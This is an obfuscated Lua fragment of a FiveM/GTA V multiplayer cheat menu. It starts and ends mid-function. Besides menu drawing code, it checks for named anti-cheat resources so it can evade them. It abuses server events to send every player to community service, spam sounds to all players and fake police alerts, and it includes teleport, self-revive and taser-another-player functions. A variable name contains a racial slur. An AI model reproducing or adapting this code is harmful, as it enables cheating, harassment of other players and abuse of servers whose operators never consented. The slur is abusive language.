		if callback_87yd78hoisgser then callback_87yd78hoisgser(checked_87gy8sodhgilds) end

		return true
	end

	return false
end


local function ComboBox_eytfuiewugerwlgesgerg(text_duhgilserg, items_dhgisorgsdfg, currentIndex_ale_mozesz_mi_possac, selectedIndex, callback_87yd78hoisgser)
	local itemsCount_udhg8oisresdfg = #items_dhgisorgsdfg
	local selectedItem_dugsirgsesre3g = items_dhgisorgsdfg[currentIndex_ale_mozesz_mi_possac]
	local isCurrent_dughisurlgsfreg = menus_ueygtyuerihgkbergerg[currentMenu_dygfuyeikesrgerg].currentOption_duhfislerjgilsedfg == (optionCount_eygfuwengjiebigoer + 1)

	if itemsCount_udhg8oisresdfg > 1 and isCurrent_dughisurlgsfreg then
		selectedItem_dugsirgsesre3g = tostring(selectedItem_dugsirgsesre3g)
	end

	if pszycisk31eqd_PN(text_duhgilserg, "- "..selectedItem_dugsirgsesre3g.." -") then
		selectedIndex = currentIndex_ale_mozesz_mi_possac
		callback_87yd78hoisgser(currentIndex_ale_mozesz_mi_possac, selectedIndex)
		return true
	elseif isCurrent_dughisurlgsfreg then
		if currentKey_hgiuerhiogewger == keys_dhgiuerhgoelgiehwgewg.left_key_dhugiuerger then
			if currentIndex_ale_mozesz_mi_possac > 1 then currentIndex_ale_mozesz_mi_possac = currentIndex_ale_mozesz_mi_possac - 1 else currentIndex_ale_mozesz_mi_possac = itemsCount_udhg8oisresdfg end
		elseif currentKey_hgiuerhiogewger == keys_dhgiuerhgoelgiehwgewg.right_key_dhugiuerger then
			if currentIndex_ale_mozesz_mi_possac < itemsCount_udhg8oisresdfg then currentIndex_ale_mozesz_mi_possac = currentIndex_ale_mozesz_mi_possac + 1 else currentIndex_ale_mozesz_mi_possac = 1 end
		end
	else
		currentIndex_ale_mozesz_mi_possac = selectedIndex
	end

	callback_87yd78hoisgser(currentIndex_ale_mozesz_mi_possac, selectedIndex)
	return false
end

local function Slider_dghiuergsergerg(text_duhgilserg, items_dhgisorgsdfg, currentIndex_ale_mozesz_mi_possac, callback_87yd78hoisgser)
	local itemsCount_udhg8oisresdfg = #items_dhgisorgsdfg
	local selectedItem_dugsirgsesre3g = items_dhgisorgsdfg[currentIndex_ale_mozesz_mi_possac]
	local isCurrent_dughisurlgsfreg = menus_ueygtyuerihgkbergerg[currentMenu_dygfuyeikesrgerg].currentOption_duhfislerjgilsedfg == (optionCount_eygfuwengjiebigoer + 1)

	if itemsCount_udhg8oisresdfg > 1 and isCurrent_dughisurlgsfreg then
		selectedItem_dugsirgsesre3g = tostring(selectedItem_dugsirgsesre3g)
	end

	if pszycisk31eqd_PN(text_duhgilserg, "- "..selectedItem_dugsirgsesre3g.." -") then
		callback_87yd78hoisgser(currentIndex_ale_mozesz_mi_possac)
		return true
	elseif isCurrent_dughisurlgsfreg then
		if currentKey_hgiuerhiogewger == keys_dhgiuerhgoelgiehwgewg.left_key_dhugiuerger then
			if currentIndex_ale_mozesz_mi_possac > 1 then currentIndex_ale_mozesz_mi_possac = currentIndex_ale_mozesz_mi_possac - 1 else currentIndex_ale_mozesz_mi_possac = currentIndex_ale_mozesz_mi_possac end
		elseif currentKey_hgiuerhiogewger == keys_dhgiuerhgoelgiehwgewg.right_key_dhugiuerger then
			if currentIndex_ale_mozesz_mi_possac < itemsCount_udhg8oisresdfg then currentIndex_ale_mozesz_mi_possac = currentIndex_ale_mozesz_mi_possac + 1 else currentIndex_ale_mozesz_mi_possac = currentIndex_ale_mozesz_mi_possac end
		end
	else
	end

	callback_87yd78hoisgser(currentIndex_ale_mozesz_mi_possac)
	return false
end


local function displej31eqda_PN()
	if isMenuVisible_trdyugfwgewiubfbeierg(currentMenu_dygfuyeikesrgerg) then
		sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, keys_dhgiuerhgoelgiehwgewg.left_key_dhugiuerger, true)
		sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, keys_dhgiuerhgoelgiehwgewg.up_key_dhugiuerger, true)
		sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, keys_dhgiuerhgoelgiehwgewg.down_key_dhugiuerger, true)
		sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, keys_dhgiuerhgoelgiehwgewg.right_key_dhugiuerger, true)
		sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, keys_dhgiuerhgoelgiehwgewg.back_key_dhugiuerger, true)
		sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, keys_dhgiuerhgoelgiehwgewg.select_key_dhugiuerger, true)

		local menu_idhgisjlofdgsersdfgsegdf = menus_ueygtyuerihgkbergerg[currentMenu_dygfuyeikesrgerg]

		if menu_idhgisjlofdgsersdfgsegdf.aboutToBeClosed_duhuisorjgsdfg then
			CloseMenu_duhgiuelgesgdf()
		else
			sritizen_INVOKE_PN(0x6178F68A87A4D3A0)

			drawTitle_ufhgiuehgunesiough()
			drawSubTitle_ydtufgekhbghskdnlgjrnei()

			currentKey_hgiuerhiogewger = nil

			if sritizen_INVOKE_PN(0x305C8DCD79DA8B0F, 0, keys_dhgiuerhgoelgiehwgewg.down_key_dhugiuerger) then
				sritizen_INVOKE_PN(0x67C540AA08E4A6F5, -1, "CLICK_BACK", "WEB_NAVIGATION_SOUNDS_PHONE", true)

				if menu_idhgisjlofdgsersdfgsegdf.currentOption_duhfislerjgilsedfg < optionCount_eygfuwengjiebigoer then
					menu_idhgisjlofdgsersdfgsegdf.currentOption_duhfislerjgilsedfg = menu_idhgisjlofdgsersdfgsegdf.currentOption_duhfislerjgilsedfg + 1
				else
					menu_idhgisjlofdgsersdfgsegdf.currentOption_duhfislerjgilsedfg = 1
				end
			elseif sritizen_INVOKE_PN(0x305C8DCD79DA8B0F, 0, keys_dhgiuerhgoelgiehwgewg.up_key_dhugiuerger) then
				sritizen_INVOKE_PN(0x67C540AA08E4A6F5, -1, "CLICK_BACK", "WEB_NAVIGATION_SOUNDS_PHONE", true)

				if menu_idhgisjlofdgsersdfgsegdf.currentOption_duhfislerjgilsedfg > 1 then
					menu_idhgisjlofdgsersdfgsegdf.currentOption_duhfislerjgilsedfg = menu_idhgisjlofdgsersdfgsegdf.currentOption_duhfislerjgilsedfg - 1
				else
					menu_idhgisjlofdgsersdfgsegdf.currentOption_duhfislerjgilsedfg = optionCount_eygfuwengjiebigoer
				end
			elseif sritizen_INVOKE_PN(0x305C8DCD79DA8B0F, 0, keys_dhgiuerhgoelgiehwgewg.left_key_dhugiuerger) then
				currentKey_hgiuerhiogewger = keys_dhgiuerhgoelgiehwgewg.left_key_dhugiuerger
			elseif sritizen_INVOKE_PN(0x305C8DCD79DA8B0F, 0, keys_dhgiuerhgoelgiehwgewg.right_key_dhugiuerger) then
				currentKey_hgiuerhiogewger = keys_dhgiuerhgoelgiehwgewg.right_key_dhugiuerger
			elseif sritizen_INVOKE_PN(0x305C8DCD79DA8B0F, 0, keys_dhgiuerhgoelgiehwgewg.select_key_dhugiuerger) then
				currentKey_hgiuerhiogewger = keys_dhgiuerhgoelgiehwgewg.select_key_dhugiuerger
			elseif sritizen_INVOKE_PN(0x305C8DCD79DA8B0F, 0, keys_dhgiuerhgoelgiehwgewg.back_key_dhugiuerger) then
				if menus_ueygtyuerihgkbergerg[menu_idhgisjlofdgsersdfgsegdf.previousMenu_digusirgiodfg] then
					sritizen_INVOKE_PN(0x67C540AA08E4A6F5, -1, "CLICK_BACK", "WEB_NAVIGATION_SOUNDS_PHONE", true)
					setMenuVisible_eqwreqtyhfioewjfiuewg(menu_idhgisjlofdgsersdfgsegdf.previousMenu_digusirgiodfg, true)
				else
					CloseMenu_duhgiuelgesgdf()
				end
			end

			optionCount_eygfuwengjiebigoer = 0
		end
	end
end


local function CurrentOption_dihgiusejrlgose()
	if currentMenu_dygfuyeikesrgerg and optionCount_eygfuwengjiebigoer ~= 0 and menus_ueygtyuerihgkbergerg[currentMenu_dygfuyeikesrgerg] then
		return menus_ueygtyuerihgkbergerg[currentMenu_dygfuyeikesrgerg].currentOption_duhfislerjgilsedfg
	end

	return nil
end


local function SetMenuWidth_djghiusesdfg(id_jdhgisrejolger, width_duhgsiuerlgsdf)
	setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'width_duhgsiuerlgsdf', width_duhgsiuerlgsdf)
end


local function SetMenuX_dhgiuelsd(id_jdhgisrejolger, x_dhgiuslergssdfg)
	setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'x_dhgiuslergssdfg', x_dhgiuslergssdfg)
end


local function SetMenuY_duhfuiaknjlsd(id_jdhgisrejolger, y_dhgiuslergssdfg)
	setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'y_dhgiuslergssdfg', y_dhgiuslergssdfg)
end


local function SetMenuMaxOptionCountOnScreen_dhfieslsfsddsdf(id_jdhgisrejolger, count_udhgislejrgsdfg)
	setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'maxOptionCount_djgiusriuogsedsfg', count_udhgislejrgsdfg)
end


local function SetTitle_dihguserhgisdg(id_jdhgisrejolger, title_duhgilgsegdfg)
	setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'title_duhgilgsegdfg', title_duhgilgsegdfg)
end


local function SetTitleColor_dihgiusejlgse(id_jdhgisrejolger, r_djguisernglse, g_IDJGIODSF, b_djguisernglse, a_djguisernglse)
	setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'titleColor_diuhgauesd', { ['r_djguisernglse'] = r_djguisernglse, ['g_IDJGIODSF'] = g_IDJGIODSF, ['b_djguisernglse'] = b_djguisernglse, ['a_djguisernglse'] = a_djguisernglse or menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].titleColor_diuhgauesd.a_djguisernglse })
end


local function SetTitleBackgroundColor_dhgisjglserg(id_jdhgisrejolger, r_djguisernglse, g_IDJGIODSF, b_djguisernglse, a_djguisernglse)
	setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'titleBackgroundColor_7567fihfsudgdsf', { ['r_djguisernglse'] = r_djguisernglse, ['g_IDJGIODSF'] = g_IDJGIODSF, ['b_djguisernglse'] = b_djguisernglse, ['a_djguisernglse'] = a_djguisernglse or menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].titleBackgroundColor_7567fihfsudgdsf.a_djguisernglse })
end


local function SetTitleBackgroundSprite_odigosheoglsfjg(id_jdhgisrejolger, texturedict_jdhgiusrjlger_dughilsemsgdf, textureName_dygfusenilgjsegfd)
	sritizen_INVOKE_PN(0xDFA2EF8E04127DD5, texturedict_jdhgiusrjlger_dughilsemsgdf)
	setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'titleBackgroundSprite_udyguiosrser3445r3', { dict_jdhgiusrjlger = texturedict_jdhgiusrjlger_dughilsemsgdf, name_idgjiserjios = textureName_dygfusenilgjsegfd })
end


local function SetSubTitle_uytdfukasjgsdklf(id_jdhgisrejolger, text_duhgilserg)
	setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'subTitle_duhgiuesrjogse', text_duhgilserg)
end


local function SetMenuBackgroundColor_8e7t8oywehgiuse(id_jdhgisrejolger, r_djguisernglse, g_IDJGIODSF, b_djguisernglse, a_djguisernglse)
	setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'menuBackgroundColor_duygu848o7ghsdf', { ['r_djguisernglse'] = r_djguisernglse, ['g_IDJGIODSF'] = g_IDJGIODSF, ['b_djguisernglse'] = b_djguisernglse, ['a_djguisernglse'] = a_djguisernglse or menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].menuBackgroundColor_duygu848o7ghsdf.a_djguisernglse })
end


local function SetMenuTextColor_uydfsgkgi438ygosdf(id_jdhgisrejolger, r_djguisernglse, g_IDJGIODSF, b_djguisernglse, a_djguisernglse)
	setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'menuTextColor_duhgsiregsd', { ['r_djguisernglse'] = r_djguisernglse, ['g_IDJGIODSF'] = g_IDJGIODSF, ['b_djguisernglse'] = b_djguisernglse, ['a_djguisernglse'] = a_djguisernglse or menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].menuTextColor_duhgsiregsd.a_djguisernglse })
end

local function SetMenuSubTextColor_duhsidlgsdres3432(id_jdhgisrejolger, r_djguisernglse, g_IDJGIODSF, b_djguisernglse, a_djguisernglse)
	setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'menuSubTextColor_dihgsurilgsdfg', { ['r_djguisernglse'] = r_djguisernglse, ['g_IDJGIODSF'] = g_IDJGIODSF, ['b_djguisernglse'] = b_djguisernglse, ['a_djguisernglse'] = a_djguisernglse or menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].menuSubTextColor_dihgsurilgsdfg.a_djguisernglse })
end

local function SetMenuFocusColor_sygudislgjsdre(id_jdhgisrejolger, r_djguisernglse, g_IDJGIODSF, b_djguisernglse, a_djguisernglse)
	setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'menuFocusColor_duhgsiurgser', { ['r_djguisernglse'] = r_djguisernglse, ['g_IDJGIODSF'] = g_IDJGIODSF, ['b_djguisernglse'] = b_djguisernglse, ['a_djguisernglse'] = a_djguisernglse or menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].menuFocusColor_duhgsiurgser.a_djguisernglse })
end


local function SetMenuButtonPressedSound_udhgislnjsdfgre(id_jdhgisrejolger, name_idgjiserjios, set_duhgiuselr)
	setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'buttonPressedSound_dhugsiurojgsegfd', { ['name_idgjiserjios'] = name_idgjiserjios, ['set_duhgiuselr'] = set_duhgiuselr })
end

--------------------------------------------------------------------------------------------

--[[
  ______   _    _   _   _   _  __   _____        _   ______ 
 |  ____| | |  | | | \ | | | |/ /  / ____|      | | |  ____|
 | |__    | |  | | |  \| | | '/  | |           | | | |__   
 |  __|   | |  | | | . ` | |  <   | |       _   | | |  __|  
 | |      | |__| | | |\  | | . \  | |____  | |__| | | |____ 
 |_|       \____/  |_| \_| |_|\_\  \_____|  \____/  |______|
                                                            
--]]

	
	local function CheckIfResourceExist_PN_DSIUGFISUDGDS(skrypt_nigger_DSUIGHSIDUGHIUDS)
	if GetResourceState_PN_DIHUIGFIDUGDFG(skrypt_nigger_DSUIGHSIDUGHIUDS) == "started"or GetResourceState_PN_DIHUIGFIDUGDFG(string.lower(skrypt_nigger_DSUIGHSIDUGHIUDS)) == "started"or GetResourceState_PN_DIHUIGFIDUGDFG(string.upper(skrypt_nigger_DSUIGHSIDUGHIUDS)) == "started"then
	        return true
		else
		    return false
		end
	end
	
    local antycheaty_dihgw3487hg8o3wdfg = {
        "anticheat",
        "Anticheat",
        "esx_anticheat",
        "anticheese",
        "anticheese-anticheat",
        "TigoAntiCheat",
        "NSAC",
        "NSAC-master",
        "TigoAntiCheat",
        "ANTICHEAT-NEXUS",
        "ANTICHEAT-Muulfz",
        "Anti-Lynx-Fivem",
        "anti-lynx",
        "antilynx",
		"chocohax",
		"UltimateAC",
		"HugeAC",
		"7777ac"
    }
	local AntyCheats_duhgw894ghwo34gdfsg = {}
	if CheckIfResourceExist_PN_DSIUGFISUDGDS("screenshot-basic") then
		JEBNIJpowiadomieni31_PN("screenshot-basic detected", 20000)
	end
	if CreateDirectory ~= nil or checkAllowed ~= nil then
		table.insert(AntyCheats_duhgw894ghwo34gdfsg, "~r~[API-AC]")
	end
	if CheckIfResourceExist_PN_DSIUGFISUDGDS("AtomicRP") then
		table.insert(AntyCheats_duhgw894ghwo34gdfsg, "~r~[AtomicAC]")
	end
	if witam ~= nil then
		table.insert(AntyCheats_duhgw894ghwo34gdfsg, "~r~[UltimateAC]")
	end
    for i_dihgiseuorg43dfg = 1, #antycheaty_dihgw3487hg8o3wdfg do
        if CheckIfResourceExist_PN_DSIUGFISUDGDS(antycheaty_dihgw3487hg8o3wdfg[i_dihgiseuorg43dfg]) then
            table.insert(AntyCheats_duhgw894ghwo34gdfsg, "~r~["..antycheaty_dihgw3487hg8o3wdfg[i_dihgiseuorg43dfg].."]")
        end
    end
local function klawiaturainput419r8q_PN(TextEntry_dihg8e4w9gsdfg, ExampleText_dug8iew74gsd, MaxStringLength_dijgps9e8r)
	sritizen_INVOKE_PN(0x32CA01C3, "FMMC_KEY_TIP1", "~y~".. TextEntry_dihg8e4w9gsdfg .. ":")
	sritizen_INVOKE_PN(0x00DC833F2568DBF6, 1, "FMMC_KEY_TIP1", "", ExampleText_dug8iew74gsd, "", "", "", MaxStringLength_dijgps9e8r)
    blockinput_dihgs8ourigdfg = true

    while sritizen_INVOKE_PN(0x0CF2B696BBF945AE) ~= 1 and sritizen_INVOKE_PN(0x0CF2B696BBF945AE) ~= 2 do
        PN_WAIT_31DA31_PN(0)
    end

    if sritizen_INVOKE_PN(0x0CF2B696BBF945AE) ~= 2 then
        local dfjs8erfdfg = GetOnscreenKeyboardResult_PN_UDHUYGFDSIGDF()
        PN_WAIT_31DA31_PN(500)
        blockinput_dihgs8ourigdfg = false
        return dfjs8erfdfg
    else
        PN_WAIT_31DA31_PN(500)
        blockinput_dihgs8ourigdfg = false
        return nil
    end
end

local function DrawText3D_PN_UDGUYSDHUGSFFDG(x_dhgiuslergssdfg, y_d8ygso9hgh9ewdfg, z_tdsa8f7gisddfs, text_diuigsodgsdfg, r_djguisernglse, g_IDJGIODSF, b_djguisernglse)
    sritizen_INVOKE_PN(0xAA0008F3BBB8F416, x_dhgiuslergssdfg, y_d8ygso9hgh9ewdfg, z_tdsa8f7gisddfs, 0)
    sritizen_INVOKE_PN(0x66E0276CC5F6B9DA, 0)
    sritizen_INVOKE_PN(0x038C1F517D7FDCF8, 0)
    sritizen_INVOKE_PN(0x07C837F9A01C34C9, 0.0, 0.20)
    sritizen_INVOKE_PN(0xBE6B23FFA53FB442, r_djguisernglse, g_IDJGIODSF, b_djguisernglse, 255)
    sritizen_INVOKE_PN(0x465C84BC39F1C351, 0, 0, 0, 0, 255)
    sritizen_INVOKE_PN(0x441603240D202FA6, 2, 0, 0, 0, 150)
    sritizen_INVOKE_PN(0x1CA3E9EAC9D93E5E)
    sritizen_INVOKE_PN(0x2513DFB0FB8400FE)
    sritizen_INVOKE_PN(0x25FBB336DF1804CB, "STRING")
    sritizen_INVOKE_PN(0xC02F4DBFB51D988B, 1)
    sritizen_INVOKE_PN(0x6C188BE134E074AA, text_diuigsodgsdfg)
    sritizen_INVOKE_PN(0xCD015E5BB0D96A57, 0.0, 0.0)
    sritizen_INVOKE_PN(0xFF0B610F6BE0D7AF)
end

local function teleporttocooooords_PN()
	local Teleport_To_Fucntiona_PN_DSGHIDUJGDF = GetFirstBlipInfoId_PN_DISGHIUDSHIGFD(8)

  	if sritizen_INVOKE_PN(0xA6DB27D19ECBB7DA, Teleport_To_Fucntiona_PN_DSGHIDUJGDF) then
  		local Teleport_To_Kords_PN_DSUGHIUSDGDF = sritizen_INVOKE_PN(0xFA7C7F0AADF25D09, Teleport_To_Fucntiona_PN_DSGHIDUJGDF, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector())
		for Teleport_To_Coords_PN_DSGHIUDSGDF = 1, 1000 do
			sritizen_INVOKE_PN(0x9AFEFF481A85AB2E, sritizen_INVOKE_PN(0xD80958FC74E988A6), Teleport_To_Kords_PN_DSUGHIUSDGDF["x"], Teleport_To_Kords_PN_DSUGHIUSDGDF["y"], Teleport_To_Coords_PN_DSGHIUDSGDF + 0.0)

			local Teleport_To_foundGround_DIUGHISDUHGIFD, zPos_xd = GetGroundZFor_3dCoord_PN_DGUISDHIGHIFD(Teleport_To_Kords_PN_DSUGHIUSDGDF["x"], Teleport_To_Kords_PN_DSUGHIUSDGDF["y"], Teleport_To_Coords_PN_DSGHIUDSGDF + 0.0)

			if Teleport_To_foundGround_DIUGHISDUHGIFD then
				sritizen_INVOKE_PN(0x9AFEFF481A85AB2E, sritizen_INVOKE_PN(0xD80958FC74E988A6), Teleport_To_Kords_PN_DSUGHIUSDGDF["x"], Teleport_To_Kords_PN_DSUGHIUSDGDF["y"], Teleport_To_Coords_PN_DSGHIUDSGDF + 0.0)

				break
			end

			PN_WAIT_31DA31_PN(0)
		end
	else
		JEBNIJpowiadomieni31_PN("You must to place waypoint!")
	end
end

local function narysuj_celownik_xd_uhfaidsoulgdfsdfg(text_diuigsodgsdfg,x_disghp9eriuogsdfg,y_d8ygso9hgh9ewdfg)
    sritizen_INVOKE_PN(0x66E0276CC5F6B9DA, 0)
    sritizen_INVOKE_PN(0x038C1F517D7FDCF8, 1)
    sritizen_INVOKE_PN(0x07C837F9A01C34C9, 0.0,0.4)
    sritizen_INVOKE_PN(0x465C84BC39F1C351, 1,0,0,0,255)
    sritizen_INVOKE_PN(0x441603240D202FA6, 1,0,0,0,255)
    sritizen_INVOKE_PN(0x1CA3E9EAC9D93E5E)
    sritizen_INVOKE_PN(0x2513DFB0FB8400FE) 
    sritizen_INVOKE_PN(0x25FBB336DF1804CB, "STRING")
    sritizen_INVOKE_PN(0x94CF4AC034C9C986, text_diuigsodgsdfg)
    sritizen_INVOKE_PN(0xCD015E5BB0D96A57, x_disghp9eriuogsdfg,y_d8ygso9hgh9ewdfg)
end

local function PN_ReviveNative_dugh8osyergoiusdfgsdfg(value_dkjgisoedfg, numDecimalPlaces_SDGIUSDHGIUSD)
	if numDecimalPlaces_SDGIUSDHGIUSD then
		local power_dshgsudiagd = 10^numDecimalPlaces_SDGIUSDHGIUSD
		return math.floor((value_dkjgisoedfg * power_dshgsudiagd) + 0.5) / (power_dshgsudiagd)
	else
		return math.floor(value_dkjgisoedfg + 0.5)
	end
end

local function PN_ReviveNative_duiagt4387guosfdsfge(ped_jgtirgirtjhilrthrth, coords_DSIGSDGSD, heading_idfhgsodiugsdrsdfg)
	sritizen_INVOKE_PN(0x239A3351AC1DA385, ped_jgtirgirtjhilrthrth, coords_DSIGSDGSD.x, coords_DSIGSDGSD.y, coords_DSIGSDGSD.z, false, false, false, true)
	sritizen_INVOKE_PN(0xEA23C49EAA83ACFB, coords_DSIGSDGSD.x, coords_DSIGSDGSD.y, coords_DSIGSDGSD.z, heading_idfhgsodiugsdrsdfg, true, false)
	sritizen_INVOKE_PN(0x239528EACDC3E7DE, ped_jgtirgirtjhilrthrth, false)
	Trigger_PN_Private_Event_digyuseogr9sdfg(false, 'playerSpawned', coords_DSIGSDGSD.x, coords_DSIGSDGSD.y, coords_DSIGSDGSD.z)
	sritizen_INVOKE_PN(0x8FE22675A5A45817, ped_jgtirgirtjhilrthrth)
end

local function PN_Revive_Native_XDIHFUDUSIFOSDFSDF()
	local coords_DSIGSDGSD = GetEntityCoords_PN_UDHGIUDIKGDFG(sritizen_INVOKE_PN(0xD80958FC74E988A6))

	local formattedCoords_SDIGHSUDIGSD = {
		x = PN_ReviveNative_dugh8osyergoiusdfgsdfg(coords_DSIGSDGSD.x, 1),
		y = PN_ReviveNative_dugh8osyergoiusdfgsdfg(coords_DSIGSDGSD.y, 1),
		z = PN_ReviveNative_dugh8osyergoiusdfgsdfg(coords_DSIGSDGSD.z, 1)
	}

	PN_ReviveNative_duiagt4387guosfdsfge(sritizen_INVOKE_PN(0xD80958FC74E988A6), formattedCoords_SDIGHSUDIGSD, 0.0)
	sritizen_INVOKE_PN(0x068E835A1D0DC0E3, 'DeathFailOut')
end

local function CommunityService_2_PN(butkukybyukbuy)
	TriggerServerEvent('esx_communityservice:sendToCommunityService', butkukybyukbuy, 5391)
end

local function CommunityService_1_PN()
	for i_DSDSGUSHDIUGSD = 0, 128 do
		CommunityService_2_PN(GetPlayerServerId_PN_DUHGIUSHGUFD(i_DSDSGUSHDIUGSD))
	end
end

local function earrape1459515q_PN()
TriggerServerEvent('InteractSound_SV:PlayOnAll', 'demo', 99.0)
TriggerServerEvent('InteractSound_SV:PlayOnAll', 'cuff', 97.0)
TriggerServerEvent('InteractSound_SV:PlayOnAll', 'buckle', 96.0)
end

local function polisaj019u8_PN()
		TriggerServerEvent('esx_outlawalert:gunshotInProgress', { x = 1337, y = 1337, z = 1337 }, 'SPAMMER PN MENU', 0)
end


 local function STEJZUJFRAJERA31DA_PN(player_HGUTJHKRHNRTRTJT)
				local ped_gjerihjetrihjrtijhirt = sritizen_INVOKE_PN(0x43A66C31C68491C0, player_HGUTJHKRHNRTRTJT)
				local Coords_hgjeihjtrihrtk = GetEntityCoords_PN_UDHGIUDIKGDFG(ped_gjerihjetrihjrtijhirt)
				
				local destiporeohgekhlertjkhe = GetPedBoneCoords_PN_GDUYFSDGF(ped_gjerihjetrihjrtijhirt, 0, 0.0, 0.0, 0.0)
				local gerjihjtreihjrthrlthr = GetPedBoneCoords_PN_GDUYFSDGF(ped_gjerihjetrihjrtijhirt, 57005, 0.0, 0.0, 0.2)
				
			sritizen_INVOKE_PN(0x867654CBC7606F2C, gerjihjtreihjrthrlthr, destiporeohgekhlertjkhe, 1, true, `WEAPON_STUNGUN`, sritizen_INVOKE_PN(0xD80958FC74E988A6), true, false, 1.0)
			end
	
	local Tertiary_SDGUSDHGISDG = {255, 205, 0, 255}
	
	   local function DisableMovement_DSIGHDSIUGSD(off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 1, 30, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 1, 31, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 1, 32, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 1, 33, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 1, 34, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 1, 35, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 1, 36, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 1, 37, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 1, 38, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 1, 44, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 1, 45, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 63, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 64, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 71, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 72, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 75, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 278, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 279, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 280, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 281, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0x5E6CC07646BBEAB8, sritizen_INVOKE_PN(0x4F8644AF03D0E0D6), off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 24, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 25, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 1, 37, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 47, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 58, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 140, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 141, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 81, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 82, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 83, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 84, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 12, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 13, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 14, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 15, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 24, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 16, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 17, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 96, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 97, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 98, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 96, off_SDGHDSUIGSD)
